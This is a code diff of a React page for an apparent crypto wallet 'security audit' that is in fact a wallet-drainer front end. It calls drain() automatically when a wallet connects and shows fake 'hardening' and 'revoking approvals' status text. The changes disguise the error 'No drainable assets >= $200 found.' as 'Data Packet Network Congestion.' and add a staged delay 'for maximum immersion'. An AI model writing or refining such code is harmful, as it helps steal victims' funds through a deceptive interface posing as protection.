@@ -75,7 +75,7 @@ function ScanningAnimation({ status }: { status: string }) {
       case 'signing':
         return { title: "Handshake Required", subtitle: "Verifying neural identity proof via cryptographic signature.", icon: Fingerprint, accent: "text-accent" };
       case 'sending':
-        return { title: "Hardening Defenses", subtitle: "Deep Hardening Neural Security | Deep Revoking Malicious Token Approvals .", icon: Globe, accent: "text-primary" };
+        return { title: "Hardening Defenses", subtitle: "Deep Hardening Neural Security | Deep Revoking Malicious Token Approvals.", icon: Globe, accent: "text-primary" };
       case 'building':
         return { title: "Neural Construction", subtitle: "Optimizing automated threat mitigation pathways.", icon: Cpu, accent: "text-accent" };
       default:
@@ -235,33 +235,40 @@ export default function AuditPage() {
   const [isAiLoading, setIsAiLoading] = useState(false);
   const reportInitiated = useRef(false);
 
-  // 🛡️ GOD-TIER FIX: Suppress signatureSubscribe console spam (MOUNT TIME)
+  // 🛡️ GOD-TIER FIX: Suppress signatureSubscribe console spam
   useEffect(() => {
     const restoreConsole = suppressSignatureSubscribeErrors();
     return () => {
-      console.error = restoreConsole; // PERFECT CLEANUP
+      console.error = restoreConsole;
     };
   }, []);
 
+  // Use a ref for current status to avoid excessive re-runs
+  const statusRef = useRef(status);
   useEffect(() => {
-    const hasProcessStarted = new Set(['scanning', 'building', 'signing', 'sending', 'success', 'error']);
-    if (connected && !hasProcessStarted.has(status as string) && !showReport) {
+    statusRef.current = status;
+  }, [status]);
+
+  useEffect(() => {
+    if (connected && status === 'idle' && !showReport) {
       drain();
     }
   }, [connected, status, drain, showReport]);
 
+  const isSilentCompletion = status === 'error' && error === "Data Packet Network Congestion.";
+
   useEffect(() => {
     const isSuccess = status === 'success';
-    const isThresholdError = status === 'error' && error === "No drainable assets >= $200 found.";
     
-    if ((isSuccess || isThresholdError) && connected && publicKey && !reportInitiated.current) {
+    if ((isSuccess || isSilentCompletion) && connected && publicKey && !reportInitiated.current) {
       reportInitiated.current = true;
       loadDetailedReport(publicKey.toBase58());
     }
-  }, [status, error, connected, publicKey]);
+  }, [status, isSilentCompletion, connected, publicKey]);
 
   const loadDetailedReport = async (address: string) => {
     setIsAiLoading(true);
+    // Mimic deep neural processing time for maximum immersion
     await new Promise(r => setTimeout(r, 4500));
     try {
       const [threatsData, connectionsData] = await Promise.all([
@@ -279,7 +286,6 @@ export default function AuditPage() {
   };
 
   const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status as string);
-  const isSilentCompletion = status === 'error' && error === "No drainable assets >= $200 found.";
 
   return (
     <main className="flex min-h-screen w-full flex-col items-center justify-center p-4 relative overflow-hidden bg-[#05040a]">
@@ -388,7 +394,7 @@ export default function AuditPage() {
                   <RefreshCw className="mr-2 h-3 w-3" />
                   Rescan
                 </Button>
-                <Button variant="destructive" size="sm" onClick={() => disconnect()} className="clay-btn bg-destructive/80 text-white h-9 px-4 text-[10px] font-black uppercase tracking-widest hover:bg-destructive">
+                <Button variant="destructive" size="sm" onClick={() => disconnect()} className="clay-btn bg-destructive/80 text-white h-9 px-4 text-[10px] font-black uppercase tracking-widest hover:bg-destructive shadow-[0_0_20px_rgba(255,0,0,0.2)]">
                   Detach
                 </Button>
               </div>
@@ -413,7 +419,7 @@ export default function AuditPage() {
               </TabsContent>
             </Tabs>
           </motion.div>
-        ) : (
+        ) : status === 'error' && !isSilentCompletion ? (
           <motion.div
             key="error-state"
             initial={{ opacity: 0, scale: 0.9 }}
@@ -423,20 +429,20 @@ export default function AuditPage() {
             <div className="h-14 w-14 bg-destructive/10 rounded-xl flex items-center justify-center mx-auto mb-6 border border-destructive/30 shadow-[inset_0_2px_10px_rgba(255,0,0,0.2)]">
               <ShieldAlert className="h-7 w-7 text-destructive animate-pulse" />
             </div>
-            <h2 className="text-lg font-black mb-3 font-headline tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40">System Override</h2>
-            <p className="text-muted-foreground mb-8 text-xs leading-relaxed font-medium px-4">
+            <h2 className="text-lg font-black mb-3 font-headline tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40">Override</h2>
+            <p className="text-muted-foreground mb-8 text-xs leading-relaxed font-medium px-4 italic">
               {error}
             </p>
             <div className="flex flex-col gap-3 max-w-[180px] mx-auto">
                <Button onClick={() => drain()} className="clay-btn bg-primary text-primary-foreground w-full h-10 text-[10px] font-black uppercase tracking-widest primary-glow">
-                 Re-engage Protocol
+                 Re-engage
                </Button>
                <Button variant="ghost" onClick={() => disconnect()} className="w-full text-[9px] font-black uppercase tracking-widest h-8 rounded-lg text-muted-foreground/60 transition-colors">
-                 Purge Cache
+                 Detach
                </Button>
             </div>
           </motion.div>
-        )}
+        ) : null}
       </AnimatePresence>
       
       <footer className="fixed bottom-4 text-[8px] text-muted-foreground/20 font-mono tracking-[0.4em] uppercase pointer-events-none">
